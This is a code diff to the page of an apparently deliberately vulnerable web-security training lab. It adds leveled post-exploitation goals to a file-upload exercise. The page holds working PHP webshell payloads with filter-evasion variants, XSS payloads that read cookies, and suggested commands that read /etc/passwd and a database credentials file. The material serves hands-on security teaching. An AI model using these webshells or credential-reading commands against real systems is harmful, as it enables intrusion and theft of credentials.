@@ -119,7 +119,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Upload: webshell (leveled) -->
 <div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
-  <p class="muted">Upload a PHP webshell, then run commands. The file checks escalate each level (the content-type is sent as image/gif for you).</p>
+  <p class="muted">Upload a PHP webshell, then use it for real post-exploitation. The content filter escalates each level (system → passthru → backticks → split-name), and each level's suggested command shows a different thing you'd actually do with RCE: <b>who am I → enumerate users → loot credentials → exfiltrate the secret</b>.</p>
   <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
   <input type="hidden" id="lvl_up" value="easy">
   <p class="note" id="note_up"></p>
@@ -127,8 +127,8 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
   <textarea id="up_code"></textarea>
   <form onsubmit="doUpload();return false"><input type="text" id="up_name" value="shell.php" style="min-width:120px"><button>Upload ▶</button></form>
   <pre id="r_up" class="rx"></pre>
-  <label class="muted">2) run a command through uploads/shell.php</label>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_up">cat ../private/upload_flag.txt</code>
+  <label class="muted">2) run a command through uploads/shell.php — <span id="cap_up" style="color:#9ab">goal</span></label>
+  <details><summary>💡 suggested command for this level</summary><code class="pl" id="pl_up">id</code>
     <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
   <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
     <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
@@ -138,6 +138,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
     <button type="button" class="ghost" onclick="setCmd('uname -a')">uname -a</button>
     <button type="button" class="ghost" onclick="setCmd('cat /etc/passwd')">/etc/passwd (users)</button>
     <button type="button" class="ghost" onclick="setCmd('ls -la ..')">ls -la ..</button>
+    <button type="button" class="ghost" onclick="setCmd('cat ../private/db_credentials.txt')">db creds</button>
     <button type="button" class="ghost" onclick="setCmd('cat ../private/upload_flag.txt')">read flag</button>
   </div>
   <iframe name="r_upc" id="r_upc" class="res"></iframe></div>
@@ -190,11 +191,18 @@ PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
 PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
 PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — set cookie uid=1)",n:"Expert — the ?id is ignored; the app trusts a uid cookie. DevTools → Application → Cookies → add uid=1, then Run."}};
 PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no content checks."},medium:{p:"<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Medium — 'system' blocked in content -> passthru()."},hard:{p:"<\x3Fphp echo `$_GET[cmd]`; ?\x3E",n:"Hard — exec-family blocked -> backticks."},expert:{p:"<\x3Fphp $f='sy'.'stem'; $f($_GET['cmd']); ?\x3E",n:"Expert — backticks blocked -> split the name (sy.stem -> system)."}};
+// Per-level webshell objective: a DIFFERENT real post-exploitation use case at each level.
+PAYLOADS.upcmd={easy:{cmd:"id",why:"confirm which OS user the web server runs as"},medium:{cmd:"cat /etc/passwd",why:"enumerate the local user accounts"},hard:{cmd:"cat ../private/db_credentials.txt",why:"loot stored credentials (the DB password)"},expert:{cmd:"cat ../private/upload_flag.txt",why:"exfiltrate the target secret (the flag)"}};
 var _ready=false;
 function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
   var d=PAYLOADS[card][lvl];
-  if(card==='up'){ document.getElementById('up_code').value=d.p; }
+  if(card==='up'){ document.getElementById('up_code').value=d.p;
+    var uc=PAYLOADS.upcmd[lvl];
+    var plu=document.getElementById('pl_up'); if(plu) plu.textContent=uc.cmd;
+    var cap=document.getElementById('cap_up'); if(cap) cap.textContent='goal: '+uc.why;
+    if(_ready){ var iu=document.getElementById('in_up'); if(iu){ iu.value=uc.cmd; try{iu.dispatchEvent(new Event('input'));}catch(e){} } }
+  }
   else { var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p; }
   var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
   var plx=document.getElementById('pl_'+card+'x'); if(plx && d.x) plx.textContent=d.x;
